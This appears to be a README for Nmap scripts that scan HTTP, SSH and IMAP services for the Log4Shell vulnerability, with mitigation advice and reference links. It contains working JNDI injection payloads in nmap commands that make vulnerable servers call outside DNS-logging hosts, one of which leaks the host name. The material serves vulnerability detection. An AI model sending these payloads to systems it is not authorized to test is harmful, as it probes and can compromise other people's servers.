# nse-log4shell

Nmap NSE scripts to check against log4shell or LogJam vulnerabilities (CVE-2021-44228).
NSE scripts check most popular exposed services on the Internet. It is basic script where you can customize payload.


### Examples

Note that NSE scripts will only issue the requests to the services. Nmap will not report vulnerable hosts, but you have to check DNS logs to determine vulnerability.
Also note that DNS resolution with prefixes combination in a expression for log4j-core <= 2.7 seems not supported. So, testing with something like ```${java:os}``` could lead to false negatives.
Therefore, better to have few false positives than negatives.

## Quick with help of dnslog.cn

Position to directory where these scripts are located and issue following commands.

On Linux:
```
cd nse-log4shell
nmap -T4 -v --script=$PWD/ scanme.nmap.org
```

On Windows:
```
cd nse-log4shell
nmap -T4 -v --script=%cd%/ scanme.nmap.org
```


## Manual configuration

Windows Example (Thanks to @ZedFuzz) - note how to [escape the quotes](https://nmap.org/book/nse-usage.html#nse-args):
```
nmap -v --script=http-log4shell,ssh-log4shell,imap-log4shell "--script-args=log4shell.payload=\"${jndi:ldap://{{target}}.xxxx.dnslog.cn}\"" -T4 -n --script-timeout=1m scanme.nmap.org
```

### By help of logdns (custom DNS logging server)

Go to http://github.com/kost/logdns and get DNS server. Get domain and point to the somewhere where you have installed logdns:

```
nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.logdns.xxx}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
```
### By help of dnslog.cn

Go to http://dnslog.cn/ and Get SubDomain. Replace your xxxx with your SubDomain:

```
nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.dnslog.cn}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
```

### By help of burpcollaborator

Take your domain from Burp collaborator and replace xxxx with your domain:

```
nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.burpcollaborator.net/diverto}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
```

### By help of CanaryToken (https://canarytokens.org/generate#)

Take your Token from CanaryToken and replace xxxx with your domain:

```
nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://x${hostName}.L4J.xxxx.canarytokens.com/a}"' -T4 -n -pssh,imap*,http* --script-timeout=1m MY.IPs.TO.SCAN
```

Thanks to @saintz666

# Solution/Fixes

List of best fixes and workarounds.

## Best fix

Best solution to protect from CVE-2021-44228:
Start your server with log4j2.formatMsgNoLookups set to true, or update to log4j-2.15.0-rc1 or later.

# References

General references and links to the vulnerability

## General

[Reddit thread](https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/) - General information about log4shell

[NCC log4shell](https://github.com/NCSC-NL/log4shell) - operational information regarding the vulnerability (IOCs, mitigation, scanning, software)

## Related

[BlueTeam CheatSheet Log4Shell](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592) - Security Advisories / Bulletins linked to Log4Shell (CVE-2021-44228)

[Software List - cheat-sheet reference guide](https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/) - Affected software list by vendor responses

## Testing

[lo4shell.huntress.com](https://log4shell.huntress.com/) - Online Log4Shell Vulnerability Tester

[log4j yara](https://github.com/timb-machine/log4j) - yara rules for local detection

[identify-log4j-class-location.sh](https://gist.github.com/righettod/ce1570954242de2f8772c6f25eece77d) - Script to identify Log4J affected class for CVE-2021-44228 in a collection of ear/war/jar files

## Exploitation

[PoC-log4j-bypass-words](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words) - A trick to bypass words blocking patches

## Exploitation Detection

[log4shell-detector](https://github.com/Neo23x0/log4shell-detector) - Detector for Log4Shell exploitation attempts

[Log4Shell-IOCs](https://github.com/curated-intel/Log4Shell-IOCs) - a list of IOC feeds and threat reports

[log4j_rce_detection.md](https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b) - You can use these commands and rules to search for exploitation attempts 

## Mitigation/Fixing

[log4j advisory](https://logging.apache.org/log4j/2.x/security.html) - Apache Log4j Security Vulnerabilities

[log4j pull request and comments](https://github.com/apache/logging-log4j2/pull/608) - pull request that fixes bug with comments

[Logout4Shell](https://github.com/Cybereason/Logout4Shell) - Quick and dirty alternative to patching manually

